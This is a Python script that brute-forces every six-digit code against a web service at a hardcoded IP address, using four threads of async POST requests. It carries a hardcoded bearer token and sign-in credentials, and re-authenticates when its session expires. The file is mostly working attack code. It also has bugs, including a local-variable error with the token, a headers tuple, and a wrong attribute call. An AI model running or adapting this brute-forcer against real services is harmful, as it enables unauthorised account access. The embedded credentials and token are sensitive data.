import asyncio
import aiohttp
import json
import threading

# global jwt


async def check_password(password):
    url = 'http://165.227.147.243:8081'
    data = json.dumps({"code": {"code":password}})
    headers={
            "Authorization": f"Bearer {jwt}"
            ,"x-requestor": "ola",
            "Content-Type": "application/json",
            "Origin": "http://165.227.147.243:8081"
        },

    async with aiohttp.ClientSession() as session:
        async with session.post(url, data=data, headers=headers) as response:
            res =  await response.text()
            if "Unauthorized."  in res or "jwt" in res :
                url = 'http://165.227.147.243:8081/api/sign-in'
                headers= {
                    "Content-Type": "application/json",
                    "Origin": "http://165.227.147.243:8081"
                }
                data=json.dumps({"user":{"email":"micheal@greenfist.xyz","password":"ola"}})
                async with session.post(url, data=data, headers=headers) as response:
                    res_auth =  await response.text()
                    jwt = json.loads(res_auth.text)['token']
                    return res_auth
                
            return res



def brute_force(start, end):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    async def worker():
        await brute_force_async(start, end)

    loop.run_until_complete(worker())
    loop.close()

async def brute_force_async(start, end):
    for i in range(start, end):
        
        password = str(i).zfill(6)
        result = await check_password(password)
        if 'invalid' not in result:
            print('Password found:', password)
            return password

def main():
    num_threads = 4
    total_combinations = 1000000
    combinations_per_thread = total_combinations // num_threads
    global jwt 
    jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluaXN0cmF0b3JAZ21haWwuY29tIiwiaWF0IjoxNjc3MzQ3NzUyLCJleHAiOjE2NzczNTEzNTJ9.7IS51-lWzShI_5fy9gvim8NxecTO3yuK33ExX7G7QHI"


    threads = []
    for i in range(num_threads):
        start = i * combinations_per_thread
        end = (i + 1) * combinations_per_thread
        thread = threading.Thread(target=brute_force, args=(start, end))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == '__main__':
    main()
